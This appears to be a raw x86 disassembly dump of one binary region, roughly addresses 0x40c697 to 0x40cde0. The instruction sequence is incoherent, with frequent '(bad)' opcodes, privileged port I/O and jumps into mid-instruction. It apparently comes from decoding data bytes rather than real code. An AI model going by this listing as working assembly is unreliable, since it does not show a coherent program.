  40c697:	xchg   edx,eax
  40c698:	mov    dl,0xc7
  40c69a:	mov    esp,0xa40efef7
  40c69f:	pop    edx
  40c6a0:	stos   BYTE PTR es:[edi],al
  40c6a1:	mov    ?,ecx
  40c6a3:	aaa    
  40c6a4:	mov    ch,0x75
  40c6a6:	out    0x3,al
  40c6a8:	scas   al,BYTE PTR es:[edi]
  40c6a9:	or     esi,edx
  40c6ab:	lds    eax,FWORD PTR [ecx]
  40c6ad:	inc    esp
  40c6ae:	test   BYTE PTR [ebx],ah
  40c6b0:	pop    es
  40c6b1:	pop    edx
  40c6b2:	xor    bl,bh
  40c6b4:	repnz data16 aas 
  40c6b7:	inc    ecx
  40c6b8:	adc    eax,0x4464f9a2
  40c6bd:	int    0x34
  40c6bf:	dec    eax
  40c6c0:	sub    BYTE PTR gs:[edx+0x2d856784],al
  40c6c7:	jno    0x40c6a2
  40c6c9:	sub    al,0x3e
  40c6cb:	jae    0x40c689
  40c6cd:	push   eax
  40c6ce:	pop    ecx
  40c6cf:	jae    0x40c651
  40c6d1:	push   0xfffffffc
  40c6d3:	add    eax,0xce41b493
  40c6d8:	push   esi
  40c6d9:	xchg   ebx,eax
  40c6da:	lahf   
  40c6db:	adc    ebp,ebx
  40c6dd:	daa    
  40c6de:	inc    edi
  40c6df:	sti    
  40c6e0:	push   edi
  40c6e1:	or     DWORD PTR [ebx-0x8],0xffffffb2
  40c6e5:	jns    0x40c6eb
  40c6e7:	ds and eax,0x408b98b7
  40c6ed:	pop    ds
  40c6ee:	cs ins BYTE PTR es:[edi],dx
  40c6f0:	cli    
  40c6f1:	out    dx,eax
  40c6f2:	(bad)  
  40c6f3:	or     DWORD PTR [edi+0x45],esp
  40c6f6:	dec    esp
  40c6f7:	xor    al,0xd0
  40c6f9:	repz fmul DWORD PTR [edx-0x14a9d767]
  40c700:	ss jp  0x40c6a1
  40c703:	outs   dx,BYTE PTR ds:[esi]
  40c704:	cs fucomi st,st(5)
  40c707:	or     eax,0xce996ae
  40c70c:	cmp    al,0xcc
  40c70e:	repz cwde 
  40c710:	adc    esp,DWORD PTR [edi+0x35]
  40c713:	out    0x80,eax
  40c715:	pop    eax
  40c716:	xor    bl,ah
  40c718:	sub    eax,0xaa88b4e6
  40c71d:	lock in eax,0xf2
  40c720:	dec    edi
  40c721:	cmp    bh,BYTE PTR [ebx+0x24]
  40c724:	dec    ebp
  40c725:	mov    bh,0xf0
  40c727:	and    al,0xee
  40c729:	stc    
  40c72a:	aam    0x83
  40c72c:	jmp    DWORD PTR [esi*4-0x1b475e57]
  40c733:	xor    dh,BYTE PTR [ebx+0x66]
  40c736:	inc    edx
  40c737:	sbb    eax,ebp
  40c739:	addr16 inc ecx
  40c73b:	loope  0x40c770
  40c73d:	jbe    0x40c729
  40c73f:	mov    ds:0x6eb8e8e5,eax
  40c744:	mov    dh,0x8c
  40c746:	xlat   BYTE PTR ds:[ebx]
  40c747:	adc    al,0x65
  40c749:	dec    ebp
  40c74a:	jl     0x40c763
  40c74c:	add    eax,0x64b3acd9
  40c751:	inc    ecx
  40c752:	stos   BYTE PTR es:[edi],al
  40c753:	pop    ds
  40c754:	push   edi
  40c755:	inc    edi
  40c756:	sbb    ebx,eax
  40c758:	retf   
  40c759:	sub    BYTE PTR [edx],cl
  40c75b:	mov    ecx,0xc0604719
  40c760:	jne    0x40c7c9
  40c762:	repnz arpl WORD PTR [ebp-0x458a1f7b],di
  40c769:	mov    ebp,0x7e7bcb57
  40c76e:	sub    ecx,ebp
  40c770:	and    bh,0x5e
  40c773:	mov    ch,BYTE PTR [edx+eax*8]
  40c776:	cmc    
  40c777:	mov    bl,0xbb
  40c779:	and    BYTE PTR [edx],0xe1
  40c77c:	paddusw mm3,QWORD PTR [edx]
  40c77f:	hlt    
  40c780:	mov    WORD PTR ds:0x8c6df763,gs
  40c786:	cmp    al,BYTE PTR [ebp-0x2733ad69]
  40c78c:	stos   BYTE PTR es:[edi],al
  40c78d:	ret    
  40c78e:	call   0xc62a:0x50cdb4d
  40c795:	add    DWORD PTR [ecx+0x71612741],0xe4558819
  40c79f:	adc    ebx,DWORD PTR [ecx-0x7580f239]
  40c7a5:	cmp    BYTE PTR [ecx],al
  40c7a7:	dec    ebx
  40c7a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a9:	(bad)  
  40c7aa:	cmp    ah,al
  40c7ac:	dec    ebx
  40c7ae:	push   edx
  40c7af:	jo     0x40c7a8
  40c7b1:	pop    ecx
  40c7b2:	out    dx,eax
  40c7b3:	and    al,0x9c
  40c7b5:	lods   al,BYTE PTR ds:[esi]
  40c7b6:	jne    0x40c7ac
  40c7b8:	ror    DWORD PTR [edx],0x47
  40c7bb:	mov    BYTE PTR [edx],ch
  40c7bd:	mov    dl,0x77
  40c7bf:	cmp    al,0x8a
  40c7c1:	in     eax,dx
  40c7c2:	es popa 
  40c7c4:	xlat   BYTE PTR ds:[ebx]
  40c7c5:	leave  
  40c7c6:	xor    eax,0xee650068
  40c7cb:	lea    edx,[esi]
  40c7cd:	fdivr  QWORD PTR [ebx]
  40c7cf:	sub    al,0xea
  40c7d1:	imul   ebx,DWORD PTR [ebx],0x3980d543
  40c7d7:	sub    BYTE PTR ds:[edx+0x62],bh
  40c7db:	mov    esi,0x1322c8fd
  40c7e0:	dec    edi
  40c7e1:	and    DWORD PTR [ebp-0x31],ecx
  40c7e4:	bound  esp,QWORD PTR [ebp+ebx*8+0x23]
  40c7e8:	(bad)  
  40c7e9:	xor    ebx,edx
  40c7eb:	or     eax,0xbad22332
  40c7f0:	push   cs
  40c7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7f2:	jae    0x40c781
  40c7f4:	xor    eax,0x7eb0bc87
  40c7f9:	dec    ebp
  40c7fa:	dec    edi
  40c7fb:	fst    DWORD PTR [edi+0x48]
  40c7fe:	mov    esp,0x2fbf090e
  40c803:	cmp    DWORD PTR ds:0x394fb600,eax
  40c809:	jp     0x40c831
  40c80b:	xlat   BYTE PTR ds:[ebx]
  40c80c:	fdivr  QWORD PTR [ecx-0x6]
  40c80f:	call   0x82f9ce5
  40c814:	gs loopne 0x40c7bc
  40c817:	popa   
  40c818:	push   esp
  40c819:	call   0x2346:0x5bc9a783
  40c820:	mov    ecx,DWORD PTR [eax]
  40c822:	fwait
  40c823:	in     al,dx
  40c824:	cmp    BYTE PTR ss:[edx],dl
  40c827:	mov    ebp,0x7937a5f4
  40c82c:	jle    0x40c829
  40c82e:	mov    eax,DWORD PTR [edx-0x6b]
  40c831:	(bad)
  40c835:	cmp    eax,DWORD PTR [ebx+0x3417795f]
  40c83b:	pop    ss
  40c83c:	dec    esi
  40c83d:	mov    esi,0xffa6e965
  40c842:	push   ebp
  40c843:	int3   
  40c844:	sbb    BYTE PTR [edi-0x3a],ah
  40c847:	test   al,0x67
  40c849:	fcom   DWORD PTR [eax]
  40c84b:	mov    cl,BYTE PTR [esi-0x7b5d551e]
  40c851:	ret    
  40c852:	pusha  
  40c853:	mov    dl,0x71
  40c855:	out    dx,al
  40c856:	jns    0x40c820
  40c858:	dec    ebp
  40c859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c85a:	nop
  40c85b:	xchg   ebp,eax
  40c85c:	not    BYTE PTR [esi]
  40c85e:	leave  
  40c85f:	add    al,0xb5
  40c861:	imul   ebp,DWORD PTR [ebp-0x17],0x6a
  40c865:	dec    eax
  40c866:	test   al,0x8f
  40c868:	loop   0x40c896
  40c86a:	pop    ecx
  40c86b:	ja     0x40c88b
  40c86d:	cmp    eax,0xcf36242d
  40c872:	inc    ebp
  40c873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c874:	push   edi
  40c875:	inc    ebp
  40c876:	shr    edi,0x83
  40c879:	xor    edx,DWORD PTR [esi+0xf9dbe38]
  40c87f:	mov    al,0xde
  40c881:	mov    eax,0xdae08dcc
  40c886:	lods   al,BYTE PTR ds:[esi]
  40c887:	jnp    0x40c905
  40c889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c88a:	lock sub eax,0xba718f9c
  40c890:	std    
  40c891:	xchg   edi,eax
  40c892:	or     al,0x4
  40c894:	add    eax,0xcfac0fa3
  40c899:	fnstenv [ebx+0x23]
  40c89c:	or     al,0xcd
  40c89e:	xchg   ecx,eax
  40c89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a0:	out    dx,eax
  40c8a1:	inc    eax
  40c8a2:	and    eax,0xf40f0571
  40c8a7:	aam    0x19
  40c8a9:	aas    
  40c8aa:	out    0xae,eax
  40c8ac:	pop    eax
  40c8ad:	sar    esi,1
  40c8af:	ds jae 0x40c925
  40c8b2:	cld    
  40c8b3:	loop   0x40c886
  40c8b5:	std    
  40c8b6:	sbb    bl,BYTE PTR [edx-0x181dd505]
  40c8bc:	push   ecx
  40c8bd:	imul   eax,DWORD PTR [eax],0xfffffffe
  40c8c0:	adc    al,0x70
  40c8c2:	lds    ecx,FWORD PTR [ebx+ebx*8]
  40c8c5:	push   ds
  40c8c6:	pop    eax
  40c8c7:	cmp    BYTE PTR [ebp-0x3e],bl
  40c8ca:	and    ch,BYTE PTR [ecx+0x45cd79d8]
  40c8d0:	jo     0x40c8b9
  40c8d2:	ss stc 
  40c8d4:	mov    ds:0xee057a94,eax
  40c8d9:	shr    DWORD PTR [eax-0x369ee55e],0x11
  40c8e0:	pop    esi
  40c8e1:	jle    0x40c8d7
  40c8e3:	cwde   
  40c8e4:	in     eax,0xa2
  40c8e6:	add    al,0x53
  40c8e8:	push   eax
  40c8e9:	leave  
  40c8ea:	out    0x13,al
  40c8ec:	loop   0x40c8cb
  40c8ee:	inc    ebx
  40c8ef:	xchg   ebx,eax
  40c8f0:	jle    0x40c904
  40c8f2:	sahf   
  40c8f3:	cs aam 0xa2
  40c8f6:	scas   al,BYTE PTR es:[edi]
  40c8f7:	scas   eax,DWORD PTR es:[edi]
  40c8f8:	push   0xffffffab
  40c8fa:	cmp    eax,0x1f082c03
  40c8ff:	rcr    DWORD PTR [esi],1
  40c901:	adc    eax,0x7ee7beed
  40c906:	mov    edx,0x2e1cf30e
  40c90b:	push   edx
  40c90c:	mov    dl,0x4a
  40c90e:	add    BYTE PTR ds:0x10943f8a,ch
  40c914:	mov    bl,0x3
  40c916:	pop    ebx
  40c917:	mov    cl,0xec
  40c919:	ss and al,0x58
  40c91c:	rdmsr  
  40c91e:	add    eax,0x6d78c16a
  40c923:	or     ah,BYTE PTR [ecx+0x745548e]
  40c929:	ins    DWORD PTR es:[edi],dx
  40c92a:	pop    esp
  40c92b:	popa   
  40c92c:	jae    0x40c923
  40c92e:	ins    BYTE PTR es:[edi],dx
  40c92f:	lods   al,BYTE PTR ds:[esi]
  40c930:	ror    BYTE PTR [ebx+0x5cd99d69],cl
  40c936:	push   ds
  40c937:	inc    ebp
  40c938:	add    BYTE PTR [edx],dh
  40c93a:	out    dx,al
  40c93b:	mov    ecx,DWORD PTR [esi-0x553f0f15]
  40c941:	outs   dx,DWORD PTR ds:[esi]
  40c942:	retf   
  40c943:	test   eax,0x4e89cc6a
  40c948:	les    esp,FWORD PTR [edi]
  40c94a:	scas   al,BYTE PTR es:[edi]
  40c94b:	(bad)  
  40c94c:	mov    ah,0x20
  40c94e:	pop    esp
  40c94f:	push   ss
  40c950:	cli    
  40c951:	and    dh,BYTE PTR [ebx]
  40c953:	fucom  st(5)
  40c955:	clc    
  40c956:	cwde   
  40c957:	add    DWORD PTR [ecx+0x4c],esp
  40c95a:	dec    edi
  40c95b:	and    bl,ah
  40c95d:	jb     0x40c93c
  40c95f:	push   0xe6ed1ab
  40c964:	lods   eax,DWORD PTR ds:[esi]
  40c965:	dec    edi
  40c966:	inc    edx
  40c967:	inc    esp
  40c968:	sahf   
  40c969:	mov    al,ds:0x70573a46
  40c96e:	or     DWORD PTR [ebp+0x65f759ab],0xaca0df51
  40c978:	xchg   ecx,eax
  40c979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c97a:	cmp    al,0xa5
  40c97c:	cwde   
  40c97d:	inc    esp
  40c97e:	sar    DWORD PTR [ecx-0x2f],cl
  40c981:	mov    ds:0xf8d0a17d,al
  40c986:	and    al,0x90
  40c988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c989:	imul   esi,DWORD PTR [edi],0x17
  40c98c:	dec    esi
  40c98d:	cdq    
  40c98e:	mov    eax,ds:0xf21e46b9
  40c993:	mov    edx,0xbe37f232
  40c998:	(bad)  
  40c99a:	int3   
  40c99b:	inc    edi
  40c99c:	cwde   
  40c99d:	jge    0x40c93c
  40c99f:	scas   al,BYTE PTR es:[edi]
  40c9a0:	jl     0x40c961
  40c9a2:	adc    eax,0x499fc191
  40c9a7:	imul   ecx,eax,0xed776f12
  40c9ad:	call   0x9dd148b4
  40c9b2:	mov    esp,0x372407d
  40c9b7:	fldenv [ecx-0xa0671c8]
  40c9bd:	mov    eax,ds:0x143d1d73
  40c9c2:	add    esp,ecx
  40c9c4:	test   edx,ebx
  40c9c6:	int3   
  40c9c7:	xchg   edi,ebp
  40c9c9:	bound  edi,QWORD PTR [esi]
  40c9cb:	dec    ebx
  40c9cc:	(bad)  
  40c9cd:	aam    0x0
  40c9cf:	sti    
  40c9d0:	mov    BYTE PTR [ebp+ebx*8+0x44],cl
  40c9d4:	fnsetpm(287 only) 
  40c9d6:	mov    edx,0x481bdf37
  40c9db:	imul   eax,DWORD PTR [ebx+esi*8],0xe384a5ca
  40c9e2:	xchg   DWORD PTR [esi+0x3d95956],esp
  40c9e8:	popf   
  40c9e9:	xchg   esp,eax
  40c9ea:	daa    
  40c9eb:	rcr    BYTE PTR [ebp+ebp*8+0x4ae58afc],cl
  40c9f2:	cmp    DWORD PTR [esi],ebp
  40c9f4:	cld    
  40c9f5:	lods   eax,DWORD PTR ds:[esi]
  40c9f6:	(bad)  
  40c9f7:	fdiv   DWORD PTR [ebx+0x60]
  40c9fa:	ss push ebx
  40c9fc:	iret   
  40c9fd:	std    
  40c9fe:	cld    
  40c9ff:	mov    ebp,0x181c8e54
  40ca04:	xor    esi,ebp
  40ca06:	inc    ecx
  40ca07:	pusha  
  40ca08:	imul   edi,DWORD PTR [edx],0x28e20eac
  40ca0e:	dec    edx
  40ca0f:	or     edx,DWORD PTR [edi]
  40ca11:	ins    DWORD PTR es:[edi],dx
  40ca12:	mov    dl,0x1f
  40ca14:	dec    edx
  40ca15:	outs   dx,DWORD PTR ds:[esi]
  40ca16:	sbb    DWORD PTR [edx],0x85e7efae
  40ca1c:	mov    al,0x90
  40ca1e:	push   esp
  40ca1f:	test   ecx,ecx
  40ca21:	sub    eax,0xd4c2f2ab
  40ca26:	jmp    0x2d26:0x9b6962f6
  40ca2d:	jle    0x40ca2b
  40ca2f:	pop    ebx
  40ca30:	jae    0x40c9e4
  40ca32:	jb     0x40ca17
  40ca34:	call   0x4af1856
  40ca39:	mov    dl,0xf6
  40ca3b:	fnsave fs:[eax-0x53]
  40ca3f:	jb     0x40ca3f
  40ca41:	cmp    DWORD PTR [esi+0x48],eax
  40ca44:	jbe    0x40ca20
  40ca46:	rdtsc  
  40ca48:	mov    BYTE PTR [edi-0x1be52a04],al
  40ca4e:	cs daa 
  40ca50:	xchg   edx,esi
  40ca52:	xor    al,0x82
  40ca54:	stc    
  40ca55:	push   edx
  40ca56:	les    esi,FWORD PTR [edx+0x56508728]
  40ca5c:	out    0x1e,eax
  40ca5e:	mov    ecx,0xbb1296d6
  40ca63:	in     al,dx
  40ca64:	pop    eax
  40ca65:	jg     0x40ca13
  40ca67:	adc    al,0x75
  40ca69:	add    esp,DWORD PTR [esi]
  40ca6b:	iret   
  40ca6c:	frstor [edx-0xc732b08]
  40ca72:	dec    eax
  40ca73:	mov    DWORD PTR [esi+eax*1-0x5b1f1244],edx
  40ca7a:	and    esp,DWORD PTR [edx-0x20]
  40ca7d:	xor    ebx,ebx
  40ca7f:	mov    al,0xce
  40ca81:	mov    ebx,0x814ecc33
  40ca86:	xor    esi,DWORD PTR [edi-0x6b]
  40ca89:	sub    DWORD PTR [ebp+0x4345e46f],0x63
  40ca90:	mov    eax,ds:0x102632ed
  40ca95:	xor    BYTE PTR [ebp-0x3755100e],bh
  40ca9b:	jp     0x40ca89
  40ca9d:	fucomip st,st(7)
  40ca9f:	loopne 0x40ca7e
  40caa1:	push   edx
  40caa2:	shl    BYTE PTR [ebp-0x74],0x8b
  40caa6:	cdq    
  40caa7:	mov    bl,0x8
  40caa9:	jl     0x40ca83
  40caab:	sbb    eax,0xaaacee2d
  40cab0:	add    DWORD PTR [ebp-0x19c9339e],esi
  40cab6:	fcom   QWORD PTR [ebx]
  40cab8:	leave  
  40cab9:	(bad)  
  40cabb:	adc    eax,0xd6d4d219
  40cac0:	cdq    
  40cac1:	xchg   ebp,eax
  40cac2:	arpl   WORD PTR ds:0x75d467a0,bx
  40cac8:	jne    0x40ca8e
  40caca:	int3   
  40cacb:	or     al,0x75
  40cacd:	jnp    0x40cb31
  40cacf:	(bad)  
  40cad0:	adc    DWORD PTR [ebp+0x25],ebx
  40cad3:	ret    0xf383
  40cad6:	jo     0x40cb20
  40cad8:	adc    bh,ch
  40cada:	cmc    
  40cadb:	ret    0xda7e
  40cade:	sbb    BYTE PTR [edx-0x17],bl
  40cae1:	je     0x40ca7e
  40cae3:	mov    cs,edx
  40cae5:	and    eax,0x2c49e0fc
  40caea:	xchg   esp,eax
  40caeb:	jecxz  0x40cb1e
  40caed:	push   esp
  40caee:	push   edi
  40caef:	test   BYTE PTR [edx-0x1b],bl
  40caf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caf3:	je     0x40caae
  40caf5:	je     0x40cac5
  40caf7:	inc    esp
  40caf8:	add    dl,BYTE PTR [ecx+0x12]
  40cafb:	mov    ds:0x1c4c9414,al
  40cb00:	sti    
  40cb01:	adc    edi,DWORD PTR [eax+eiz*8+0x37]
  40cb05:	adc    eax,0xe3773eb4
  40cb0a:	or     al,0x73
  40cb0c:	cmp    dl,BYTE PTR [ebp+0x7b]
  40cb0f:	pop    eax
  40cb10:	iret   
  40cb11:	xchg   esp,eax
  40cb12:	cs mov ah,0x65
  40cb15:	sub    eax,0x6b321dd1
  40cb1a:	sub    cl,bl
  40cb1c:	adc    ebx,ebp
  40cb1e:	fild   DWORD PTR [edi]
  40cb20:	cmp    al,0xb4
  40cb22:	leave  
  40cb23:	dec    esp
  40cb24:	(bad)  
  40cb25:	pop    ebp
  40cb26:	or     al,0xdb
  40cb28:	leave  
  40cb29:	jmp    0xaf2bf08
  40cb2e:	adc    eax,0x8b60081a
  40cb33:	push   ecx
  40cb34:	adc    al,0x25
  40cb36:	or     cl,bh
  40cb38:	(bad)  
  40cb39:	or     BYTE PTR [eax],dh
  40cb3b:	mov    ecx,0x37f8cb43
  40cb40:	lahf   
  40cb41:	addr16 mov esp,0xd2140422
  40cb47:	stos   BYTE PTR es:[edi],al
  40cb48:	adc    BYTE PTR [ebx+edx*1-0x70],0xbb
  40cb4d:	imul   edi,DWORD PTR [eax-0x6e],0x584c4f72
  40cb54:	jno    0x40cafe
  40cb56:	jne    0x40cb0b
  40cb58:	push   ecx
  40cb59:	fs pop ecx
  40cb5b:	cmp    eax,0x284d5f4d
  40cb60:	add    esi,DWORD PTR [ecx]
  40cb62:	jl     0x40cb9b
  40cb64:	push   ss
  40cb65:	and    DWORD PTR [eax-0x5c],esi
  40cb68:	aad    0x8f
  40cb6a:	xor    edx,DWORD PTR [ebx]
  40cb6c:	add    BYTE PTR [edi+0x370b9392],bh
  40cb72:	loop   0x40cbf1
  40cb74:	hlt    
  40cb75:	dec    ebx
  40cb76:	jmp    0xbdb6:0x10f717f9
  40cb7d:	cmp    eax,DWORD PTR [edx-0x129d03d7]
  40cb83:	scas   eax,DWORD PTR es:[edi]
  40cb84:	jmp    0x40cb2a
  40cb86:	test   DWORD PTR [esi+0x538743b9],ecx
  40cb8c:	cmp    DWORD PTR [ecx],0xe2ee7d45
  40cb92:	and    esp,DWORD PTR [ebx]
  40cb94:	scas   eax,DWORD PTR es:[edi]
  40cb95:	mov    esi,0x24cb5587
  40cb9a:	lods   al,BYTE PTR ds:[esi]
  40cb9b:	xchg   ecx,eax
  40cb9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb9d:	push   cs
  40cb9e:	or     BYTE PTR [esi],cl
  40cba0:	sbb    BYTE PTR [ecx+0xfd0a86a],0xe2
  40cba7:	add    dl,al
  40cba9:	cwde   
  40cbaa:	aaa    
  40cbab:	mov    bl,0x84
  40cbad:	jbe    0x40cbd0
  40cbaf:	mov    WORD PTR [edi+ecx*2],gs
  40cbb2:	std    
  40cbb3:	addr16 push es
  40cbb5:	xchg   ebx,eax
  40cbb6:	mov    WORD PTR [edi+0x3e],es
  40cbb9:	and    DWORD PTR [ecx-0x625872b7],edi
  40cbbf:	test   eax,0x699b98d
  40cbc4:	or     eax,0xb57f1454
  40cbc9:	adc    esi,DWORD PTR [esi+ebp*2-0x164613fa]
  40cbd0:	jae    0x40cc0e
  40cbd2:	sbb    DWORD PTR [eax+0x3b],esp
  40cbd5:	push   esi
  40cbd6:	jae    0x40cb81
  40cbd8:	retf   
  40cbd9:	jne    0x40cc2a
  40cbdb:	cdq    
  40cbdc:	cmp    al,0x69
  40cbde:	(bad)  
  40cbdf:	pop    edx
  40cbe0:	dec    edx
  40cbe1:	mov    es,ebx
  40cbe3:	addr16 daa 
  40cbe5:	mov    BYTE PTR [ebx-0x7b2aba0d],cl
  40cbeb:	popa   
  40cbec:	push   0x2d443ed9
  40cbf1:	xor    eax,0x36570ddf
  40cbf6:	fimul  WORD PTR [edx]
  40cbf8:	loop   0x40cc71
  40cbfa:	leave  
  40cbfb:	ficomp WORD PTR [esi-0x32e79bb9]
  40cc01:	jecxz  0x40cbc0
  40cc03:	push   cs
  40cc04:	js     0x40cc79
  40cc06:	xchg   ebp,eax
  40cc07:	mov    eax,ds:0xbc47377c
  40cc0c:	stc    
  40cc0d:	rcl    DWORD PTR [edx-0x1e],cl
  40cc10:	add    al,0xff
  40cc12:	xor    dl,BYTE PTR [eax-0x64]
  40cc15:	mov    esp,0x60979e7
  40cc1a:	mov    ds:0x41098cc8,al
  40cc1f:	pop    esi
  40cc20:	xlat   BYTE PTR ds:[ebx]
  40cc21:	test   al,0xa
  40cc23:	jo     0x40cbf0
  40cc25:	sbb    edx,ecx
  40cc27:	fucomp st(6)
  40cc29:	or     cl,al
  40cc2b:	push   edx
  40cc2c:	adc    DWORD PTR [ebp-0x34],edx
  40cc2f:	test   DWORD PTR [ebx],ebp
  40cc31:	daa    
  40cc32:	push   ebx
  40cc33:	neg    BYTE PTR [eax]
  40cc35:	scas   eax,DWORD PTR es:[edi]
  40cc36:	inc    esi
  40cc37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc38:	mov    cl,BYTE PTR [ecx-0x1]
  40cc3b:	and    BYTE PTR [edi+0x19],bh
  40cc3e:	in     eax,dx
  40cc3f:	mov    DWORD PTR [ebx-0x29ce4d91],ebp
  40cc45:	or     BYTE PTR [esi+esi*4],bh
  40cc48:	xor    esp,DWORD PTR [ebp+eax*2-0x3c]
  40cc4c:	cmp    bl,dl
  40cc4e:	mov    edx,0xd8e9d66d
  40cc53:	mov    ch,0xd6
  40cc55:	and    ebp,DWORD PTR [eax+0x2f18f231]
  40cc5b:	in     al,0x4b
  40cc5d:	cmp    eax,0x4d562610
  40cc62:	push   edx
  40cc63:	pusha  
  40cc64:	add    DWORD PTR [eax+0x1863767c],esp
  40cc6a:	push   esp
  40cc6b:	ja     0x40cc54
  40cc6d:	cmp    eax,0x8744b769
  40cc72:	push   esi
  40cc73:	mov    ss,WORD PTR [ecx-0x2e]
  40cc76:	jl     0x40cc86
  40cc78:	push   ds
  40cc79:	in     al,0x2
  40cc7b:	add    eax,esp
  40cc7d:	inc    BYTE PTR [edx-0x50]
  40cc80:	or     eax,0x3a094ced
  40cc85:	mov    edx,0x622569d8
  40cc8a:	and    eax,0xc32c7e54
  40cc8f:	mov    BYTE PTR [edx+0x1a851fd3],bl
  40cc95:	in     eax,dx
  40cc96:	or     eax,DWORD PTR [eax-0x3c]
  40cc99:	or     eax,0xe2ed8e48
  40cc9e:	cmp    eax,0x58733c70
  40cca3:	out    dx,eax
  40cca4:	xchg   si,ax
  40cca6:	loop   0x40cc4e
  40cca8:	push   eax
  40cca9:	jg     0x40cc37
  40ccab:	enter  0xd3d3,0xbd
  40ccaf:	xchg   esp,eax
  40ccb0:	(bad)  
  40ccb1:	imul   edi,DWORD PTR [edi+0x55],0x18
  40ccb5:	(bad)  
  40ccb6:	lods   eax,DWORD PTR ds:[esi]
  40ccb7:	pop    eax
  40ccb8:	std    
  40ccb9:	xchg   ecx,eax
  40ccba:	inc    DWORD PTR [esi*8-0x70ccc7f0]
  40ccc1:	scas   al,BYTE PTR es:[edi]
  40ccc2:	call   0x410d3ce2
  40ccc7:	xchg   ebp,eax
  40ccc8:	pop    ss
  40ccc9:	outs   dx,BYTE PTR ds:[esi]
  40ccca:	mov    al,0xae
  40cccc:	cmp    ch,ah
  40ccce:	sub    ecx,ecx
  40ccd0:	xchg   sp,ax
  40ccd2:	icebp  
  40ccd3:	jno    0x40cd51
  40ccd5:	test   DWORD PTR [ecx+ebx*8-0x6cc93f45],ebx
  40ccdc:	or     al,BYTE PTR [edx-0x3e2fdd6c]
  40cce2:	bound  ebx,QWORD PTR [esi-0x6c]
  40cce5:	cmp    dl,BYTE PTR [edx-0x267a723a]
  40cceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccec:	and    eax,0x95705757
  40ccf1:	adc    DWORD PTR [esi+ebx*4],edi
  40ccf4:	push   edi
  40ccf5:	out    0x95,eax
  40ccf7:	loope  0x40cd0c
  40ccf9:	or     ch,cl
  40ccfb:	jmp    0x545d:0xdb1e1524
  40cd02:	nop
  40cd03:	and    ebx,esp
  40cd05:	je     0x40cca4
  40cd07:	out    0x79,eax
  40cd09:	es pop ebx
  40cd0b:	out    0x45,eax
  40cd0d:	push   cs
  40cd0e:	and    dh,cl
  40cd10:	jb     0x40cd25
  40cd12:	add    dl,ah
  40cd14:	jnp    0x40ccc8
  40cd16:	push   ebp
  40cd17:	fst    QWORD PTR [ebp+0x5ba64b5e]
  40cd1d:	mov    ebx,0x86005fea
  40cd22:	not    DWORD PTR [ebx+0x52]
  40cd25:	dec    edx
  40cd26:	sbb    eax,0x54ff0243
  40cd2b:	pop    esp
  40cd2c:	push   edx
  40cd2d:	and    cl,BYTE PTR [edx-0x1e4cbcc]
  40cd33:	jle    0x40cd5d
  40cd35:	cmp    DWORD PTR [edx],ebx
  40cd37:	pop    ss
  40cd38:	jne    0x40cda0
  40cd3a:	test   ebp,ecx
  40cd3c:	jmp    0x40cd65
  40cd3e:	jecxz  0x40cd74
  40cd40:	gs jo  0x40ccca
  40cd43:	das    
  40cd44:	pop    esi
  40cd45:	cmp    DWORD PTR [ebp-0x6d454cf2],0x4961b144
  40cd4f:	bound  eax,QWORD PTR ds:0x95cf49ba
  40cd55:	fdivr  DWORD PTR [edi+ebx*8]
  40cd58:	or     al,0xc1
  40cd5a:	sbb    eax,0x8aa5833c
  40cd5f:	cdq    
  40cd60:	(bad)  
  40cd61:	jecxz  0x40cda8
  40cd63:	jg     0x40cd1c
  40cd65:	inc    ebx
  40cd66:	mov    edi,0x1a119afb
  40cd6b:	stc    
  40cd6c:	clc    
  40cd6d:	ret    
  40cd6e:	fwait
  40cd6f:	mov    ah,0x59
  40cd71:	dec    esi
  40cd72:	cmp    al,0x17
  40cd74:	arpl   WORD PTR gs:[esi+0x64],di
  40cd78:	mov    ds:0xd21971de,eax
  40cd7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd7e:	pop    edi
  40cd7f:	jns    0x40cdfa
  40cd81:	sti    
  40cd82:	outs   dx,BYTE PTR ds:[esi]
  40cd83:	push   esp
  40cd84:	imul   ecx,esp,0xffffffbe
  40cd87:	adc    edi,DWORD PTR [edi+ebp*4-0x69]
  40cd8b:	(bad)  
  40cd8c:	and    cl,cl
  40cd8e:	rol    DWORD PTR ds:[eax+0x467c74cd],cl
  40cd95:	pushf  
  40cd96:	div    DWORD PTR [eax]
  40cd98:	and    bl,dl
  40cd9a:	cmp    BYTE PTR [edx+0x3c],cl
  40cd9d:	mov    BYTE PTR [ebp-0x97a79df],cl
  40cda3:	dec    esi
  40cda4:	xchg   ecx,eax
  40cda5:	or     eax,0xec92ab46
  40cdaa:	push   esi
  40cdab:	inc    ecx
  40cdac:	xor    DWORD PTR [edi+eiz*1],edi
  40cdaf:	fisttp WORD PTR [edx]
  40cdb1:	int3   
  40cdb2:	iret   
  40cdb3:	sti    
  40cdb4:	dec    edx
  40cdb5:	(bad)  
  40cdb7:	aaa    
  40cdb8:	leave  
  40cdb9:	je     0x40cdaf
  40cdbb:	dec    esp
  40cdbc:	ins    BYTE PTR es:[edi],dx
  40cdbd:	dec    esp
  40cdbe:	jno    0x40cd4b
  40cdc0:	scas   al,BYTE PTR es:[edi]
  40cdc1:	xor    eax,0xb2acb1a7
  40cdc6:	test   ecx,esi
  40cdc8:	sti    
  40cdc9:	bswap  esp
  40cdcb:	pushw  es
  40cdcd:	in     eax,dx
  40cdce:	jmp    0x942092be
  40cdd3:	xchg   esi,eax
  40cdd4:	add    eax,0x72ca12b3
  40cdd9:	(bad)  
  40cdda:	popf   
  40cddb:	sbb    BYTE PTR [ecx],dh
  40cddd:	sti    
  40cdde:	jae    0x40cd92
  40cde0:	je     0x40cd69
